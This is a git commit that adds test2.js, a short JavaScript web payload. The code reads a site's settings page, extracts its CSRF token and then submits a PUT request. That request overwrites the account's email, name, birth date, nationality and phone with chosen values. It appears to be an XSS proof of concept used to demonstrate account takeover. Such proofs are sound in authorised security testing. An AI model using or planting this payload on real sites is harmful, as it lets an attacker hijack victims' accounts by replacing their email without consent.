6bbf7f012fd51baeb3172980e67d648078af8f0d
ispomael <ispomael@gmail.com>
2025-07-24 18:22:44 +0200

    Create test2.js

---
+++ test2.js
@@ -0,0 +1,10 @@
+var req = new XMLHttpRequest();
+req.onload = handleResponse;
+req.open('get','/settings/general',true);
+req.send();
+function handleResponse() {
+    var token = this.responseText.match(/name="csrf-token" content="(\w+)"/)[1];
+    var changeReq = new XMLHttpRequest();
+    changeReq.open('put', '/settings/general', true);
+    changeReq.send('_token='+token+'&email=testaa@testaaa.coma&_method=PUT&last_name=Ahauka&first_name=Makuri&date_de_naissance=1992-11-05&nationalite=BE&phone=0499999999')
+};
